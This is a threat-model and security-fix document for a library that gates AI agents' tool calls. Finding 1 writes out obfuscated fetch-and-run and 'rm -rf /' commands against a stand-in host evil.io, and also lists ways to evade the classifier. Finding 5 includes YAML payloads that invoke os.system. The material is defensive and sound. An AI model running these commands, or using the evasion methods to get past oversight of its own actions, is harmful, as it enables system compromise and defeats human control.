# Security model

This document is the output of a threat-modeling pass over `packages/toolgovern/src/` and
`packages/toolgovern-cli/src/`, done with an OWASP-Top-10 / STRIDE mindset specific to what this
library actually does: classify a tool call's arguments and gate it before it executes. It covers
what was found, what was fixed (with the regression test that proves it), and what is disclosed as
a known v0.1 limitation instead of silently shipped.

Every finding below was reproduced with a real script or test before being called a finding.
"Plausible but unverified" ideas are not listed here.

## Fixed

### 1. Argument obfuscation could bypass the shell-risk classifier (TG01)

**The gap.** The TG01 rules (`rm -rf`, pipe-to-shell, `sudo`, etc.) matched literal
substrings/regexes against the raw command text. Four obfuscation techniques bypassed this
undetected, confirmed with a standalone script before any fix:

- **Base64-decode-then-execute**, no literal `curl`/`wget` token present:
  `echo Y3VybCBodHRwOi8vZXZpbC5pby9wYXlsb2FkIHwgc2g= | base64 -d | sh`
- **Empty-quote-pair splitting** (`''`/`""` contribute nothing to what a POSIX shell runs, but
  break a literal match): `cu''rl https://evil.io/payload | sh`, `r""m -rf /`
- **Invisible Unicode characters** (zero-width space, etc.) spliced into a token to break a
  `\b(curl|wget)\b`-style word-boundary match: `cu<ZWSP>rl https://evil.io/payload | sh`
- **`$IFS` as a stand-in for a literal space** (a standard shell-filter-bypass technique):
  `rm${IFS}-rf${IFS}/`

**The fix.**

- `packages/toolgovern/src/classifier/util.ts` adds `normalizeForMatch()`: Unicode NFKC
  normalization, stripping of zero-width/bidi-control/invisible-format characters, `$IFS`/`${IFS}`
  collapsed to a space, adjacent empty-quote pairs collapsed (repeatedly, so `r""""m` is fully
  resolved), and a backslash immediately before a plain letter/digit removed (`c\url` -> `curl`).
  This does not change what gets executed -- it only closes the gap between what the shell will
  run and what the regex sees. Applied in `shell-risk.ts` (`commandText()`), `credential-access.ts`
  (`pathOrCommandText()`, `keychainAccess`, `bulkEnvDump`), and `util.ts`'s
  `extractCandidateHost()` (used by the TG03 network-egress rules).
- A new rule, `TG01-decoded-payload-execution`, catches the base64/hex/openssl-decode-then-execute
  shape directly: it fires when the command contains a recognized decode step (`base64 -d`,
  `base64 --decode`, `openssl enc -d`, `xxd -r`, `certutil -decode`, a Python `b64decode` call) _and_
  the same command feeds a shell/interpreter (a trailing `| sh`/`| bash`/etc., a `$()` substitution,
  backticks, `eval`/`exec`, or `sh -c`/`bash -c`). A plain decode with no execution context next to
  it (`base64 -d payload.b64 > payload.bin`) does not fire.

**Proof.** `packages/toolgovern/test/classifier/shell-risk.test.ts` (`argument obfuscation
resistance` and `TG01-decoded-payload-execution` describe blocks) and
`packages/toolgovern/test/classifier/credential-access.test.ts` (`argument obfuscation
resistance`) exercise every technique above against the actual rule and assert it now fires.

**What this does not cover.** This is a per-call regex classifier, not a shell-grammar parser or
an AST-based static analyzer. It closes the specific, concretely-demonstrated obfuscation classes
above. It does **not** attempt full POSIX-shell tokenization, so more exotic constructions --
brace expansion (`{c,}url`), indirect variable expansion (`${!x}`), arguments assembled from
several _different_ argument-object keys that a specific framework's tool executor concatenates
after toolgovern has already evaluated them, or a decode utility outside the list above -- can
still evade detection. A platform-security team that needs guaranteed coverage against a
determined adversary should treat this classifier as one layer, not the only layer (the same
caveat that applies to any regex/heuristic-based WAF or EDR rule).

### 2. Polynomial-time ReDoS in the `rm -rf` rule

**The gap.** `TG01-rm-rf`'s original pattern was
`/\brm\s+(-[a-z]*f[a-z]*r[a-z]*|-[a-z]*r[a-z]*f[a-z]*)\b\s*(\S*)/i` -- two `[a-z]*` groups
separated only by required single letters, in an alternation with the same groups reordered. That
shape gives the regex engine many equivalent ways to partition a long run of non-matching flag
characters, which is a classic polynomial (not necessarily catastrophic-exponential, but still
severe) ReDoS shape. Measured directly:

| Adversarial input (`"rm -" + "f".repeat(n)`, no terminating `r`) | Time (old pattern) |
| ---------------------------------------------------------------- | ------------------ |
| n = 1,000                                                        | 0.99ms             |
| n = 5,000                                                        | 13.75ms            |
| n = 20,000                                                       | 334.87ms           |
| n = 50,000                                                       | 2,508ms            |
| n = 80,000                                                       | 6,020ms            |

Because `governTool()` runs the classifier synchronously, inline, on every tool call (that is the
whole design -- no network round-trip), a single long argument string blocks the host process for
seconds. This is a real availability risk: an agent argument containing a long run of `f`
characters (plausible in a large embedded blob, not even necessarily adversarial) would stall
every other tool call in the same process.

**The fix.** Replaced the ambiguous alternation with a bounded, unambiguous token pattern:
`/\brm\s+((?:-[a-z-]{1,16}\s+)*-[a-z-]{1,16})(?:\s+(\S+))?/i`, then checks in plain JavaScript
(`.includes('f')`, `.includes('r')`, both immune to backtracking) whether the captured flag
cluster contains both letters. Each token is bounded to 16 characters and there is exactly one way
to partition a matching string across the groups, which removes the ambiguity the backtracking
blowup depended on. As a side effect this also now recognizes multi-token flags (`rm -r -f /`,
not just `rm -rf /`), which the original single-token pattern did not.

**Proof.** `packages/toolgovern/test/classifier/shell-risk.test.ts` (`TG01-rm-rf ReDoS
resistance`) runs the exact 80,000-character adversarial payload from the table above and asserts
evaluation stays under 200ms; measured in practice at ~2.5ms. All prior `TG01-rm-rf` true/false
positive tests still pass unchanged.

The other TG01-TG05 regexes (pipe-to-shell, sudo, chmod-777, fork-bomb, reverse-shell, disk-wipe,
credential/network patterns) were stress-tested the same way -- long runs of non-matching
characters, and payloads shaped like each pattern's own repeated tokens -- and none showed the
same blowup; they use simple, unambiguous, linear-scan patterns.

### 3. A throwing approval handler skipped the trace and leaked a raw error

**The gap.** `governTool()`'s `require-approval` path called the caller-supplied
`onApprovalRequired` handler and awaited the result. If that handler threw (synchronously or via a
rejected promise), the exception propagated out of `resolveApproval()` and out of `execute()`
_before_ the `trace.append()` call and before `onDecision()` fired. Two problems: the underlying
tool never ran (so it was not unsafe), but (a) the caller saw a raw, unrelated `Error` instead of
the library's own `ToolGovernDenialError`, and (b) **no trace entry was written for that call at
all** -- a silent gap in the audit trail. That directly violates this project's own rule that
"every gate decision must be explainable from the trace alone."

Reproduced with a standalone test before fixing: a handler that threw `Error('handler blew up')`
surfaced that exact error, not `ToolGovernDenialError`.

**The fix.** `resolveApproval()` in `packages/toolgovern/src/middleware/onToolCall.ts` now treats
a throwing/rejecting handler exactly like "no handler" or "timed out": `.catch(() => false)`, so
it resolves to a denial instead of propagating. This restores both invariants -- fail-closed _and_
always-traced.

**Proof.**
`packages/toolgovern/test/middleware/onToolCall.test.ts` adds three tests: a synchronously-throwing
handler and a rejecting-promise handler both now reject with `ToolGovernDenialError`, and a
dedicated test confirms the trace entry for that call still gets written (asserting the classifier
decision and fired rule ID appear in the trace file) where before the fix no entry existed at all.

## Reviewed, and hardened where a real fix was possible

### 4. Trace tamper-evidence (`--verify-chain`)

**What was already true and already disclosed.** The trace's default `signature` is a `sha256:`
content hash, not a keyed signature -- `docs/trace-format.md` already stated plainly that this
proves an entry has not changed since it was written, but does not stop "an attacker who has full
write access to the trace file recomputing every subsequent hash after tampering." A test already
existed (`detects a tampered signature`) proving the _naive_ case is caught: if you hand-edit a
field and leave the old signature in place, `verifyChain()` flags the mismatch.

**What we verified and made explicit.** The deeper, previously-undemonstrated case: an attacker
who edits an entry _and_ recomputes its `sha256:` signature (trivial, since the hash needs no
secret) produces a trace that still passes `verifyChain()`. This is now proven directly by a test
(`packages/toolgovern/test/trace/trace-reader.test.ts`, "documents the residual limitation of the
unkeyed sha256 scheme") rather than only asserted in prose, so the limitation cannot silently
regress into an unproven claim.

**The improvement shipped.** `TraceWriter` now accepts an optional `secretKey` (`TraceWriterOptions`).
When set, entries are signed `hmac-sha256:<hex>` instead of `sha256:<hex>`. `verifyChain()` accepts
a matching `secretKey` and:

- verifies an `hmac-sha256:` entry correctly when given the right key,
- **reports an issue** (not a silent pass) if an `hmac-sha256:` entry is presented with no key or
  the wrong key,
- keeps verifying legacy/default `sha256:` entries exactly as before, per-entry, regardless of
  whether the caller happens to also supply a `secretKey`.

That last point was a real bug caught during the manual end-to-end QA pass (Section 5 of the
build checklist), not something caught by a unit test first: `verifyChain()` initially applied
whatever `secretKey` it was given to _every_ entry regardless of that entry's own signature
scheme, so running `toolgovern-cli audit --verify-chain --key-file <path>` against a perfectly
valid, untampered, unkeyed (`sha256:`) trace reported every single entry as `CHAIN INVALID` --
the key was being used to recompute a signature for entries that were never signed with a key at
all. Fixed by only applying `secretKey` to entries whose own scheme is `hmac-sha256`; a `sha256:`
entry is always recomputed unkeyed. Regression tests added at both layers:
`packages/toolgovern/test/trace/trace-reader.test.ts` ("verifies a chain written WITHOUT a key
even when the caller supplies a secretKey anyway") and
`packages/toolgovern-cli/test/cli.test.ts` ("verifies an unkeyed (sha256) trace fine even when
--key-file is passed anyway").

`toolgovern-cli audit --verify-chain` gained a `--key-file <path>` flag that reads a raw key file
and passes it through.

Proof: `packages/toolgovern/test/trace/trace-reader.test.ts` (`hmac-sha256 keyed signing`) covers
round-trip verification, missing-key detection, a forged-entry-with-wrong-key rejection, and the
mixed-scheme regression above. `packages/toolgovern-cli/test/cli.test.ts` covers the `--key-file`
flag end to end, including a clear error when the key file itself does not exist.

**Residual limitation, disclosed rather than hidden.** Keyed signing raises the bar -- an attacker
without the key cannot forge a valid entry -- but it is not a complete solution. toolgovern does
not generate, store, rotate, or protect this key; that is entirely the operator's responsibility.
An attacker who can read _both_ the trace file and the key file (most realistically: the same OS
user account the governed agent process runs as) can still edit an entry and produce a
signature that verifies. Real protection against that threat model requires either an external,
write-once anchor (the trace shipped to a remote, append-only sink outside the local attacker's
reach) or a proper key-management service (HSM, cloud KMS, OS keychain with process-level ACLs)
-- both are out of scope for a v0.1, self-hosted, no-server-dependency local trace file, and are
explicitly proprietary/hosted-layer territory per the project's own OSS/proprietary split, not
something silently promised by the OSS core.

### 5. YAML policy loading (`loadPolicy`, `toolgovern-cli validate`)

**Reviewed, confirmed safe, no change needed.** Both `packages/toolgovern/src/policy/loadPolicy.ts`
and `packages/toolgovern-cli/src/cli.ts` parse policy files with the `yaml` package (eemeli/yaml,
not `js-yaml`) using its default `parse()` call -- no custom schema, no unsafe/`FAILSAFE_SCHEMA`
opt-out. This is a materially different library and API from the historically-unsafe
`js-yaml.load()` path. Verified directly:

```
a: !!js/function "function (){return 1}"        -> parsed as the plain string "function (){return 1}"
a: !!python/object/apply:os.system ["echo pwned"] -> parsed as {"a": ["echo pwned"]}, os.system never invoked
a: !!js/undefined ~                              -> parsed as the plain string "~"
```

Unrecognized tags are left as unresolved plain scalars (with a warning), never deserialized into
executable objects. There is no code-execution path here. No fix required.

### 6. Path handling in the CLI (`validate <policy-file>`, `audit <trace-file>`)

**Reviewed, not applicable as a vulnerability.** "Path traversal" is a vulnerability when an
application accepts partial, attacker-controlled input and appends it to a trusted base directory
across a privilege boundary (e.g., a server resolving `baseDir + userInput`). `toolgovern-cli` has
no such boundary: `validate` and `audit` take a full file path directly from the invoking user's
own shell, exactly the same trust model as `cat` or `less`. There is no intermediate trust boundary
for a path argument to escape -- the CLI process already runs with the invoking user's own
filesystem permissions. No fix applied; documented here so this was a considered "not applicable"
rather than an unreviewed gap.

### 7. Filesystem-scope path matching (TG02) is prefix-string comparison, not canonicalization

**Reviewed, disclosed as a known limitation, no fix applied in v0.1.** `isPathWithin()`
(`packages/toolgovern/src/shared/paths.ts`) normalizes `./`, duplicate slashes, and trailing
slashes, and separately `TG02-path-traversal` rejects any path containing a literal `..` segment.
It does **not** resolve symlinks or call anything like `fs.realpath()` -- toolgovern's classifier
never touches the filesystem itself; it evaluates the argument string the calling framework hands
it. A path that resolves differently once the real tool executor follows a symlink, or that uses
an encoding the calling framework itself decodes before actually touching disk (e.g. a framework
that unescapes `%2e%2e` before calling its filesystem tool), is outside what a stateless,
filesystem-free classifier can see. This is the same category of limitation TG06/TG07
(session-level, cross-call context) are meant to eventually help with, not a v0.1 defect.

### 8. Cross-agent scope inheritance (TG05) and default-deny intersection

**Reviewed, no issues found.** Walked `computeInheritedScope()` and `ScopeRegistry` in
`packages/toolgovern/src/scoping/inheritance-enforcer.ts`: a sub-agent's granted scope is always
the intersection of what it requests and what its coordinator currently has (never a union, never
an implicit default-allow), an unregistered coordinator yields the empty scope rather than
unrestricted access, and TG05's rules re-check every call against the registry (not just at spawn
time), including the case where a coordinator's own scope has since shrunk. The existing test
suite (`inheritance-enforcer.test.ts`, `cross-agent-inheritance.test.ts`) already covers this with
both true- and false-positive cases; no gap was found that warranted a new rule or a fix here.

### 9. Agent identity is caller-asserted, not cryptographically verified

**The gap, and what is (and is not) fixed here.** `RuleContext.agentId` and `Policy.agentId`
(`packages/toolgovern/src/types.ts`) are plain strings. Nothing in `governTool()`
(`packages/toolgovern/src/middleware/onToolCall.ts`) or the scoping registry
(`packages/toolgovern/src/scoping/`) cryptographically verifies that a caller supplying a given
`agentId` actually is that agent. Any caller that can invoke `governTool()` can claim any
`agentId` string, get evaluated against that agent's granted scope, and have decisions recorded
under that identity in the trace. **This is not fixed in this pass, and is not claimed to be
fixed.** Full identity verification -- signed caller tokens, mTLS client certs, a trusted broker
that mints and attests `agentId`s -- is a real feature with real design tradeoffs (key
management, revocation, how a "coordinator" and its "sub-agents" would each get and rotate
credentials) that belongs in its own pass, not bolted onto this one.

**What this pass does instead: a scoped, honest partial improvement.**

- **Format validation.** `isValidAgentId()` (`packages/toolgovern/src/scoping/scope-declaration.ts`)
  rejects `agentId` values that are empty, longer than 256 characters, or contain ASCII control
  characters / the Unicode line-and-paragraph-separator characters (U+0000-U+001F, U+007F,
  U+2028, U+2029). `governTool()` calls it on any explicitly-supplied `options.agentId` and
  throws `InvalidAgentIdError` synchronously (at wrap time, before any tool call is evaluated or
  traced) if it fails. This catches a concrete, narrow class of malformed/malicious input --
  empty-string identity, unbounded-length payloads, embedded null bytes or newlines that could be
  used for log injection or to forge what looks like an extra trace line -- that should never be
  treated as an identity at all, independent of whether identity is ever verified. It does **not**
  verify that a well-formed string is true; a well-formed lie passes exactly as easily as it did
  before.
- **Identity-source provenance.** `governTool()` now records whether the `agentId` used for a
  call was `'explicit'` (the caller passed `options.agentId`) or `'fallback'` (no `agentId` was
  supplied, so toolgovern used `'default-agent'`), as a new optional `agentIdSource` /
  `agent_id_source` field on `TraceEntryInput` / `TraceEntry`
  (`packages/toolgovern/src/types.ts`) and the corresponding trace line
  (`docs/trace-format.md`). This gives an auditor reading the trace after the fact one more
  signal: a run of decisions all recorded under `'fallback'` means no caller ever asserted a
  distinct identity for that agent, which is useful context when investigating an incident, even
  though `'explicit'` still does not mean the asserted identity was verified.

**What this explicitly does NOT do**, stated plainly so it is not mistaken for more than it is:

- It does not prove a caller is who it claims to be.
- It does not stop a malicious caller from asserting another agent's exact `agentId` string
  (impersonation), as long as that string happens to be well-formed.
- It does not add any authentication, signing, or token-issuance mechanism.
- `agent_id_source: "explicit"` is not an attestation -- it only means _some_ caller supplied
  _some_ well-formed string, not that the string is accurate.

**Proof.** `packages/toolgovern/test/scoping/scope-declaration.test.ts` (`isValidAgentId`) covers
the accepted/rejected format cases (empty string, over-length string, embedded null byte,
embedded newline, control characters, non-string input, and realistic well-formed identities like
UUIDs and namespaced strings). `packages/toolgovern/test/middleware/onToolCall.test.ts`
(`agent identity format validation` and `agent identity source` describe blocks) cover
`governTool()` throwing `InvalidAgentIdError` for a malformed explicit `agentId`, and the trace
correctly recording `agent_id_source: 'explicit'` vs. `'fallback'` for the corresponding call
paths, alongside confirmation that existing valid-identity flows (a normal explicit `agentId`, and
the no-`agentId`-supplied default path) are unaffected.

## Fixed (added in a later pass)

### 10. TG03 network-egress: hostname arguments that resolve to a private/loopback/metadata address

**The gap.** TG03's `raw-ip-literal` rule (`packages/toolgovern/src/classifier/network-egress.ts`
/ `python/src/toolgovern/classifier/network_egress.py`) already denies a raw IP literal argument
(`127.0.0.1`, `169.254.169.254`, IPv6 equivalents, decimal-encoded IPv4, ...) that targets
loopback/RFC1918/link-local/cloud-metadata space. What it did **not** catch: a **hostname**
argument that merely _resolves_ to one of those same addresses. `internal-alias.attacker.io ->
127.0.0.1` (an attacker-controlled DNS record, or an innocuous local `/etc/hosts` alias) sailed
through undetected, because the classifier only ever inspected the literal argument string, never
performed a DNS lookup. This is exactly the SSRF/DNS-rebinding shape both
[microsoft/autogen#7706](https://github.com/microsoft/autogen/pull/7706) (hoangperry's AutoGen SSRF
fix, which explicitly resolves a hostname and checks the resolved IP before allowing an outbound
call) and [crewAIInc/crewai#6504](https://github.com/crewAIInc/crewai/issues/6504) (ashusnapx's
crewAI DNS-rebinding report) describe.

**The fix.**

- **TypeScript.** A new rule, `TG03-dns-resolves-private`, resolves a candidate hostname via
  `dns.promises.lookup(host, { all: true })` (which honors `/etc/hosts`, same as a real HTTP
  client's own resolution would) and applies the exact same
  `isPrivateOrMetadataTarget()` range check already used for raw IP literals to every resolved
  address. Because DNS resolution is inherently asynchronous in Node, this rule lives in a new,
  separate `AsyncRule` shape (`types.ts`) and a new `networkEgressAsyncRules` registry
  (`network-egress.ts`), evaluated by a new `classifyAsync()` (`classifier/index.ts`) rather than
  the existing synchronous `classify()`. `governTool()`'s `execute()` -- already `async` end to
  end -- now calls `classifyAsync()` instead of `classify()`, so this check actually runs on every
  gated call rather than silently never firing. The pre-existing, synchronous `classify()` is
  unchanged and still available for callers with no event loop to await from; it simply does not
  run this one DNS-dependent rule, which is now stated plainly in its own doc comment rather than
  left as a surprise.
- **Python.** The equivalent rule resolves via `socket.getaddrinfo()` (which also honors
  `/etc/hosts`). Because `govern_tool()` is fully synchronous end to end in this port (a
  deliberate, pre-existing design choice -- see `on_tool_call.py`'s module docstring) and
  `socket.getaddrinfo()` is itself a blocking call, no separate async entry point was needed: the
  rule is an ordinary member of the single `rule_registry` / `classify()`, bringing the Python
  rule count to 35 (34 + this rule) against the TS package's 34-rule synchronous registry plus 1
  async-only rule. Same check, same failure-closed behavior, different plumbing dictated by each
  language's own concurrency model -- this asymmetry is intentional, not an oversight, and is
  called out explicitly rather than glossed over as "the same 34/35 rules on both sides."
- **Failure-closed on resolution failure, on both sides.** A DNS lookup that fails (NXDOMAIN,
  resolver error, timeout) or resolves to an empty address list returns `require-approval`, never
  an implicit `allow` -- an unresolvable host is never treated as evidence of safety. A hard
  timeout (3s on both sides: `Promise.race` against `setTimeout` in TS, a daemon
  `threading.Thread.join(timeout)` in Python, the same idiom `on_tool_call.py`'s own approval
  timeout already uses) stops a hung/unresponsive resolver from stalling a gated call
  indefinitely.

**What this explicitly does NOT fix -- disclosed, not hidden:**

- **DNS-rebinding TOCTOU is narrowed, not eliminated.** This is a resolve-then-check at
  classification time, not a connection-time guarantee. An attacker who controls the target
  hostname's DNS answer can still change what it resolves to _after_ this check runs and _before_
  the tool's own HTTP client actually opens the connection -- classic TOCTOU. Fully closing that
  gap requires the tool's own HTTP client to connect to the exact address this check
  resolved-and-validated (DNS pinning at the connection layer), which `governTool()` /
  `govern_tool()` -- a pre-execution _argument_ gate, confirmed by reading
  `onToolCall.ts` / `on_tool_call.py` end to end -- has no mechanism to enforce. It evaluates
  arguments before a call; it does not sit inside, or control, the HTTP client that eventually
  makes the real connection.
- **Redirect-chain revalidation is a separate, still-open gap, not attempted here.** Re-checking
  each hop of an HTTP redirect chain (a request to an allowed host that 302s to
  `http://169.254.169.254/`) requires runtime visibility into the tool's actual HTTP
  client -- which redirects it followed, to which URLs -- that a pre-execution argument classifier
  fundamentally does not have. `governTool()` sees the arguments a call was made with, once, before
  it executes; it has no hook into the HTTP client's own redirect-following logic afterward.
  Building real coverage for this needs a different integration shape entirely: a fetch-wrapper (or
  HTTP-client middleware) the tool opts into, which re-invokes the classifier -- or at minimum the
  raw-IP/private-target check -- against each redirect target as the client follows it. That is
  new, separate surface area, not a variant of the existing argument-gate model, and is not
  attempted in this pass.

**Proof.** `packages/toolgovern/test/classifier/network-egress.test.ts` (`TG03-dns-resolves-private
(async DNS-resolution check)`, mocked `node:dns`) covers: a hostname resolving to loopback, to the
cloud-metadata address, to one-of-several-private-addresses, to a public-only address (no fire),
resolution failure and empty-result-set (both `require-approval`), skipping DNS entirely for a raw
IP literal argument, the explicit-allowlist carve-out, and the "never approvable via a blanket
`network: true` grant" case mirroring `TG03-raw-ip-literal`'s own rule. A separate
`network-egress-dns-real.test.ts` exercises the same rule against the real, unmocked OS resolver:
`localhost` (denied, via a genuine `/etc/hosts`-backed lookup) and a guaranteed-unresolvable
`.invalid`-TLD hostname (RFC 2606) failing closed. `classifier/index.test.ts` proves `classifyAsync()`
agrees with `classify()` on every synchronous case and additionally catches the DNS-resolving case
that `classify()` cannot. `middleware/onToolCall.test.ts` proves the fix is wired through the real
`governTool()` call chain end to end (not just correct in isolation), again against the real
resolver. On the Python side, `test_classifier_network_egress.py` mirrors every mocked case via
`unittest.mock.patch("socket.getaddrinfo", ...)` plus a real-resolver `localhost`/`.invalid` pair,
`test_classifier_index.py` proves `classify()` alone (no async variant needed) catches the
DNS-resolving case, and `test_middleware_on_tool_call.py` proves `govern_tool()` denies it end to
end against the real resolver.

**Confirmed against the two issues that motivated this fix** (read via `gh pr view` / `gh issue
view` before writing this, not assumed from their titles):

- [microsoft/autogen#7706](https://github.com/microsoft/autogen/pull/7706) -- **partially closed.**
  hoangperry's actual PR body describes two distinct fixes to `fetch_webpage()`: (a) `_validate_url()`
  resolves the target hostname and blocks RFC1918/loopback/link-local ranges before the request, and
  (b) switching `httpx`'s `follow_redirects` from `True` to `False` and validating each redirect
  target before following it (the PR's own test plan explicitly includes "Redirect to private IP ->
  ValueError (redirect guard)"). `TG03-dns-resolves-private` closes fix (a) -- the same
  resolve-then-check-against-private-ranges logic, applied at the `governTool()` argument-gate layer
  instead of inside `fetch_webpage()` itself. It does **not** close fix (b): redirect-chain
  revalidation is exactly the "genuinely separate, still-open gap" this document already discloses
  above and in "What this does not cover" -- a pre-execution argument classifier has no visibility
  into redirects an HTTP client follows after the call it gated. So: half of what this specific PR
  fixes is closed, half (the redirect guard) is not, and is not claimed to be.
- [crewAIInc/crewai#6504](https://github.com/crewAIInc/crewai/issues/6504) -- **partially closed,
  and only for one of its two reported vulnerabilities.** The report (read in full, not just its
  title) describes two distinct vulnerabilities: **(1) DNS-rebinding TOCTOU** in
  `safe_get()`/`validate_url()` -- it resolves DNS, checks the IP, returns the URL as a string, and
  the _subsequent_ `requests.get(url)` call resolves DNS **again**, so the record can change in
  between; and **(2) MCP tool wrappers bypass SSRF protection entirely** -- arguments (including
  URLs) passed to MCP servers never go through `validate_url()`/`safe_get()` at all.
  `TG03-dns-resolves-private` does not close either of these as the report frames them: vulnerability
  (1) is architecturally the _same_ check-time-vs-connect-time gap this rule itself has (see the
  residual-limitation disclosure above) -- it catches the static case (a hostname that already
  resolves private right now) but not the actual rebinding race the report centers on, since
  `governTool()` cannot pin the resolved address at the tool's own connection layer either.
  Vulnerability (2) is not addressed at all by this change: it is a report that certain crewAI code
  paths skip calling their own validator, which is an integration-completeness question (does the
  host application actually route every tool call, including MCP ones, through `governTool()`?), not
  a gap in what the classifier checks once it _is_ invoked. toolgovern's existing (pre-dating this
  pass) nested-argument host extraction already finds a host buried inside a nested MCP tool-call
  payload -- see `extractCandidateHost()`'s "SSRF via nested MCP tool payloads" tests -- but that is
  a different, already-shipped capability, not something this fix adds or extends.

## Summary

| #   | Area                                                                           | Status                                                                                                                                         |
| --- | ------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | TG01 argument obfuscation (base64, quote-splitting, invisible Unicode, `$IFS`) | Fixed + tested                                                                                                                                 |
| 2   | ReDoS in `TG01-rm-rf`                                                          | Fixed + tested                                                                                                                                 |
| 3   | Approval handler exception skips trace / leaks raw error                       | Fixed + tested                                                                                                                                 |
| 4   | Trace tamper-evidence (unkeyed default vs. attacker who recomputes the hash)   | Documented limitation (pre-existing) + proven with a test + optional HMAC-keyed signing shipped as a real mitigation                           |
| 5   | YAML policy-loader RCE risk                                                    | Reviewed, confirmed safe, no change needed                                                                                                     |
| 6   | CLI path-argument traversal                                                    | Reviewed, not applicable, no change needed                                                                                                     |
| 7   | Filesystem-scope path canonicalization                                         | Documented known limitation, no fix in v0.1                                                                                                    |
| 8   | Cross-agent scope inheritance soundness                                        | Reviewed, no issues found                                                                                                                      |
| 9   | Agent identity is caller-asserted, not cryptographically verified              | Partial fix + tested (format validation + trace provenance); identity verification remains out of scope                                        |
| 10  | TG03 hostname arguments resolving to a private/loopback/metadata address       | Fixed + tested (both languages); DNS-rebinding TOCTOU narrowed, not eliminated; redirect-chain revalidation remains a separate, still-open gap |

Nothing in this document should be read as "toolgovern makes a gated agent session safe." A gated
call means it was evaluated against the current rule set and, for the classes of bypass covered
above, the classifier now resists the specific obfuscation techniques that were checked and
confirmed. It is not a guarantee against every possible bypass, and it is not a claim that TG06/TG07
(session-level anomaly detection, not yet built) would have caught a multi-step attack that only
looks suspicious in aggregate.

## What this does not cover

The threat model above is scoped to what `governTool()` actually does: classify a tool call's
arguments against a rule set and gate the call before it executes. The items below are genuinely
out of scope for that model -- not overlooked, but categorically outside what a per-call,
in-process, stateless argument classifier can address. Listed here on the same policy as the rest
of this document: disclosed, not silently omitted.

- **Deserialization/pickle safety.** Unsafe object deserialization (`pickle.loads` on untrusted
  bytes, insecure deserialization gadgets, and similar) happens inside a tool's own implementation
  once it starts executing, not at the call boundary toolgovern gates. toolgovern sees the
  arguments passed into a tool call; it has no visibility into what that tool does with a byte
  stream internally. (Not to be confused with finding #5 above, which reviews toolgovern's _own_
  YAML policy-file parser -- a narrower, different claim.)

- **Signature/attestation verification of agent identity.** toolgovern's `agentId`
  (`packages/toolgovern/src/types.ts`) is a plain, caller-supplied string that nothing in the
  codebase authenticates -- `governTool()` (`packages/toolgovern/src/middleware/onToolCall.ts`)
  trusts whatever the host process passes in, defaulting to the literal string `'default-agent'`
  if none is given at all. This is a known, tracked gap, not a design decision: proving _who_ an
  agent is (mTLS, signed JWTs, a PKI-backed attestation service) is agent-identity infrastructure,
  a different problem from deciding whether a call _should_ happen once an identity is asserted.
  Treat `agentId` as a label the host application vouches for, not a boundary toolgovern itself
  enforces.

- **Process-level sandboxing / resource isolation.** rlimits, filesystem namespace isolation, and
  container/VM boundaries are questions about the environment a tool executes in. toolgovern gates
  the _decision_ to call a tool; it does not launch, control, or constrain the process that
  actually runs it, so a call a policy allows can still misbehave at the OS level in ways only a
  real sandbox would catch.

- **CLI/config-scaffolding credential generation.** A project generator hardcoding a default
  database password, or a scaffolding CLI writing a weak secret into a `.env` at setup time, is a
  software-supply-chain concern that happens before, or entirely outside, any tool call toolgovern
  ever sees. There is no `governTool()` invocation in that path to gate.

- **Idempotency / at-most-once execution guarantees across retries.** The classifier is stateless
  per call today: it evaluates the arguments in front of it and does not track whether a given
  call is a fresh request or a retry of one that already ran. Retry-safe, exactly-once semantics
  are the calling framework's responsibility, not something inferable from a single call's
  arguments alone.

- **MCP-server trust boundary (origin allowlisting, server signature/PKI verification).** Deciding
  whether to trust and connect to a given MCP server at all is a connection-time, server-identity
  concern that is resolved before toolgovern's classifier ever runs. toolgovern evaluates the
  arguments of an individual call; it has no model of, and does not evaluate, which server issued
  the tool definition being called.

- **Real process/kernel-level resource isolation (Docker/Firecracker/WASM-style sandboxing).**
  Related to the process-isolation point above but worth stating on its own: `governTool()` is an
  in-process, pre-execution decision gate -- a function call that returns allow/deny/require-approval
  -- not an isolation executor. It enforces no memory or CPU limits of its own; that is the job of
  whatever executor actually runs the underlying tool.

- **HTTP redirect-chain revalidation.** TG03's DNS-resolution check (see finding #10 above)
  resolves and validates a call's declared _target_ hostname before the call executes. It does not,
  and structurally cannot, see or re-validate any redirect a request follows once the tool's own
  HTTP client is running -- a request to an allowed, validated host that responds with a `302` to
  `http://169.254.169.254/` completes outside anything `governTool()` observes. Closing this
  requires runtime visibility into the HTTP client itself (a fetch-wrapper or client middleware the
  tool opts into, re-checking each redirect hop), a genuinely different integration shape from the
  pre-execution argument gate this classifier is. Not attempted in this pass; tracked here as an
  open gap, not silently assumed covered by the DNS-resolution fix above.

- **DNS-rebinding TOCTOU (connection-time DNS pinning).** Related to, but distinct from, the
  redirect-chain gap above: finding #10's DNS-resolution check narrows the DNS-rebinding attack
  surface (a hostname that already resolves to a private/metadata address at classification time is
  now caught) but does not eliminate the race itself -- an attacker who controls the DNS answer can
  still change it between this check and the tool's own HTTP client's later connect call.
  Eliminating that race needs the HTTP client to connect to the exact address this check
  validated (DNS pinning), which is connection-layer behavior `governTool()` has no hook into.
